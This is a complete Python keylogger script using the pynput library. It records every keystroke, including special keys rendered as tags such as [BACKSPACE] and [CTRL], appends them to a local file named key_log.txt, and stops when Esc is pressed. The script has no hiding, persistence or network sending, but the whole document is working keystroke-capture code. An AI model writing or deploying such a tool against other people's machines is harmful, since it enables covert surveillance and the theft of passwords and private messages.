import logging
from pynput import keyboard

# Configure logging
logging.basicConfig(filename='keylogger_errors.log', level=logging.ERROR, 
                    format='%(asctime)s:%(levelname)s:%(message)s')

# Specify the path to the log file
log_file = "key_log.txt"

# Define a mapping for special keys to readable strings
special_keys = {
    keyboard.Key.space: " ",
    keyboard.Key.enter: "\n",
    keyboard.Key.backspace: "[BACKSPACE]",
    keyboard.Key.tab: "[TAB]",
    keyboard.Key.esc: "[ESC]",
    keyboard.Key.shift: "[SHIFT]",
    keyboard.Key.shift_r: "[SHIFT]",
    keyboard.Key.ctrl_l: "[CTRL]",
    keyboard.Key.ctrl_r: "[CTRL]",
    keyboard.Key.alt_l: "[ALT]",
    keyboard.Key.alt_gr: "[ALT_GR]",
    keyboard.Key.caps_lock: "[CAPS_LOCK]",
    # Add other special keys if needed
}

# A set to keep track of currently pressed keys
pressed_keys = set()

# Function to handle key press events
def on_press(key):
    pressed_keys.add(key)  # Add the pressed key to the set of pressed keys
    try:
        if hasattr(key, 'char') and key.char is not None:  # Check if the key has a 'char' attribute and it is not None
            file.write(key.char)  # Write the character to the log file
        else:
            # Write the readable string for special keys to the log file
            file.write(special_keys.get(key, f"[{key}]"))
    except Exception as e:
        logging.error(f"Error: {e}")

# Function to handle key release events
def on_release(key):
    pressed_keys.discard(key)  # Remove the released key from the set of pressed keys
    if key == keyboard.Key.esc:  # Check if the released key is the escape key
        # Stop the listener
        return False

# Open the log file once and keep it open while the listener is running
try:
    with open(log_file, "a") as file:
        # Collect events until released
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:  # Set up the listener for keyboard events
            listener.join()  # Start the listener and keep it running until it is stopped
except Exception as e:
    logging.error(f"Failed to open log file: {e}")
